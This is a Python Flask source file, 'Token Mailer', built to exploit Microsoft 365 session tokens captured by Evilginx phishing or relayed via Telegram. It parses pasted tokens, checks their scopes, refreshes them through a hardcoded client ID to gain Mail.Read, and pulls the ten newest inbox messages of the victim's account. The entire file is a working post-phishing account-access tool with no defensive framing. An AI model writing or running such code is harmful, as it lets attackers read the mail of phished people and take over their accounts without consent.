#!/usr/bin/env python3
"""
Token Mailer - Paste Microsoft 365 tokens, fetch first 10 emails from inbox.
Usage: python token-mailer.py
Then open http://localhost:5001
"""

import os
import json
import base64
import webbrowser
from datetime import datetime, timedelta

import requests
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# Microsoft Graph endpoints
GRAPH_API = "https://graph.microsoft.com/v1.0"
TOKEN_REFRESH_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

# HTML template (single page)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Token Mailer – Fetch Inbox</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 1200px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
        .container { background: white; border-radius: 8px; padding: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        textarea { width: 100%; height: 300px; font-family: monospace; font-size: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; }
        button { background: #0078d4; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 14px; }
        button:hover { background: #005a9e; }
        .error { color: #d13438; background: #fde7e9; padding: 10px; border-radius: 4px; margin: 10px 0; }
        .success { color: #107c10; background: #dff6dd; padding: 10px; border-radius: 4px; margin: 10px 0; }
        .warning { color: #9b6a00; background: #fff4ce; padding: 10px; border-radius: 4px; margin: 10px 0; }
        .email-item { border-left: 4px solid #0078d4; margin: 10px 0; padding: 10px; background: #fafafa; border-radius: 4px; }
        .email-subject { font-weight: bold; }
        .email-from { color: #666; font-size: 13px; margin: 5px 0; }
        .email-preview { font-size: 13px; color: #333; margin-top: 5px; }
        .email-date { font-size: 11px; color: #999; }
        pre { background: #f0f0f0; padding: 10px; overflow-x: auto; border-radius: 4px; }
        hr { margin: 20px 0; }
    </style>
</head>
<body>
<div class="container">
    <h2>📧 Token Mailer – Paste Captured Tokens</h2>
    <p>Paste the JSON output from Telegram or Evilginx (must contain <code>access_token</code>).<br>
    The script will automatically fetch the latest 10 emails from the inbox if the token has <code>Mail.Read</code> permission.</p>
    <textarea id="tokenInput" placeholder='Example:
{
  "access_token": "eyJ0eXAi...",
  "refresh_token": "0.AU8...",
  "email": "victim@example.com"
}'></textarea><br>
    <button onclick="fetchEmails()">📬 Fetch Inbox (first 10 emails)</button>
    <div id="result"></div>
</div>

<script>
function fetchEmails() {
    const raw = document.getElementById('tokenInput').value;
    if (!raw.trim()) {
        showError("Please paste token JSON.");
        return;
    }
    let data;
    try {
        data = JSON.parse(raw);
    } catch(e) {
        showError("Invalid JSON: " + e.message);
        return;
    }
    // Normalize common structures from Evilginx/Telegram
    if (data.raw_response && data.raw_response.access_token) {
        data = {
            access_token: data.raw_response.access_token,
            refresh_token: data.raw_response.refresh_token,
            email: data.email
        };
    }
    if (data.tokens && data.tokens.access_token) {
        data = {
            access_token: data.tokens.access_token,
            refresh_token: data.tokens.refresh_token,
            email: data.email
        };
    }
    if (!data.access_token) {
        showError("No access_token found in the pasted data.");
        return;
    }
    showLoading();
    fetch('/api/fetch_inbox', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
    })
    .then(res => res.json())
    .then(result => {
        if (result.error) {
            showError(result.error);
        } else {
            showEmails(result.emails, result.email, result.scopes, result.refreshed);
        }
    })
    .catch(err => showError(err.toString()));
}

function showLoading() {
    document.getElementById('result').innerHTML = '<div class="success">⏳ Fetching emails, please wait...</div>';
}
function showError(msg) {
    document.getElementById('result').innerHTML = `<div class="error">❌ ${escapeHtml(msg)}</div>`;
}
function showEmails(emails, email, scopes, refreshed) {
    if (!emails || emails.length === 0) {
        document.getElementById('result').innerHTML = `<div class="success">📭 No emails found for ${escapeHtml(email)}.</div>`;
        return;
    }
    let html = `<div class="success">✅ Found ${emails.length} emails for ${escapeHtml(email)}.${refreshed ? ' (Token was auto-refreshed)' : ''}</div>`;
    html += `<div><strong>Scopes:</strong> ${escapeHtml(scopes.join(', '))}</div><hr>`;
    emails.forEach((msg, idx) => {
        const sender = msg.from?.emailAddress?.address || 'Unknown';
        const subject = msg.subject || '(No subject)';
        const preview = (msg.bodyPreview || '').substring(0, 150);
        const date = new Date(msg.receivedDateTime).toLocaleString();
        html += `
        <div class="email-item">
            <div class="email-subject">${idx+1}. ${escapeHtml(subject)}</div>
            <div class="email-from">📧 From: ${escapeHtml(sender)}</div>
            <div class="email-date">📅 ${date}</div>
            <div class="email-preview">${escapeHtml(preview)}${preview.length>=150?'…':''}</div>
        </div>`;
    });
    html += `<hr><p>🔗 <a href="https://outlook.office.com/mail/inbox" target="_blank">Open Outlook Inbox</a></p>`;
    document.getElementById('result').innerHTML = html;
}
function escapeHtml(str) {
    if (!str) return '';
    return str.replace(/[&<>]/g, function(m) {
        if (m === '&') return '&amp;';
        if (m === '<') return '&lt;';
        if (m === '>') return '&gt;';
        return m;
    });
}
</script>
</body>
</html>
"""

# Helper functions
def decode_jwt(token):
    """Decode JWT payload without verification."""
    try:
        parts = token.split('.')
        if len(parts) < 2:
            return {}
        payload = parts[1]
        payload += '=' * ((4 - len(payload) % 4) % 4)
        return json.loads(base64.b64decode(payload))
    except:
        return {}

def get_token_scopes(access_token):
    claims = decode_jwt(access_token)
    scp = claims.get('scp', '')
    return scp.split(' ') if scp else []

def has_mail_read(scopes):
    return any(s in scopes for s in ['Mail.Read', 'Mail.ReadWrite', 'Mail.Read.All'])

def refresh_access_token(refresh_token, client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c"):
    """Attempt to refresh the access token."""
    data = {
        "client_id": client_id,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": "https://graph.microsoft.com/Mail.Read offline_access"
    }
    try:
        resp = requests.post(TOKEN_REFRESH_URL, data=data, timeout=15)
        if resp.status_code == 200:
            tokens = resp.json()
            return tokens.get("access_token")
    except Exception as e:
        print(f"Refresh error: {e}")
    return None

def fetch_emails(access_token, limit=10):
    """Fetch latest limit emails from inbox."""
    headers = {"Authorization": f"Bearer {access_token}"}
    url = f"{GRAPH_API}/me/mailFolders/inbox/messages?$top={limit}&$select=subject,from,receivedDateTime,bodyPreview&$orderby=receivedDateTime desc"
    try:
        resp = requests.get(url, headers=headers, timeout=20)
        if resp.status_code == 200:
            data = resp.json()
            return data.get("value", [])
        elif resp.status_code == 401:
            return None  # Token expired
        else:
            print(f"Graph error: {resp.status_code} - {resp.text[:200]}")
            return []
    except Exception as e:
        print(f"Request error: {e}")
        return []

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/fetch_inbox', methods=['POST'])
def api_fetch_inbox():
    data = request.get_json()
    if not data:
        return jsonify({"error": "Missing JSON body"}), 400

    access_token = data.get('access_token')
    refresh_token = data.get('refresh_token')
    if not access_token:
        return jsonify({"error": "No access_token provided"}), 400

    scopes = get_token_scopes(access_token)
    refreshed = False

    # Check if Mail.Read is present
    if not has_mail_read(scopes):
        # Try to refresh if we have a refresh token (maybe the new token will have Mail.Read)
        if refresh_token:
            new_token = refresh_access_token(refresh_token)
            if new_token:
                access_token = new_token
                scopes = get_token_scopes(access_token)
                refreshed = True
        if not has_mail_read(scopes):
            return jsonify({
                "error": f"Token lacks Mail.Read permission. Scopes: {scopes}",
                "scopes": scopes
            }), 403

    # Fetch emails
    emails = fetch_emails(access_token, limit=10)
    if emails is None and refresh_token:
        # Token expired, try refresh
        new_token = refresh_access_token(refresh_token)
        if new_token:
            access_token = new_token
            emails = fetch_emails(access_token, limit=10)
            refreshed = True
        else:
            return jsonify({"error": "Token expired and refresh failed"}), 401
    elif emails is None:
        return jsonify({"error": "Token expired and no refresh token provided"}), 401

    # Extract email from token claims for display
    claims = decode_jwt(access_token)
    user_email = claims.get('email') or claims.get('unique_name') or data.get('email', 'Unknown')

    return jsonify({
        "emails": emails,
        "email": user_email,
        "scopes": scopes,
        "refreshed": refreshed,
        "count": len(emails)
    })

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║           Token Mailer – Paste Tokens, Fetch Inbox              ║
    ║                                                                  ║
    ║  1. Open http://localhost:5001                                   ║
    ║  2. Paste the JSON from Telegram (access_token required)         ║
    ║  3. Click "Fetch Inbox" – get first 10 emails                    ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    webbrowser.open("http://localhost:5001")
    app.run(host="0.0.0.0", port=5001, debug=False)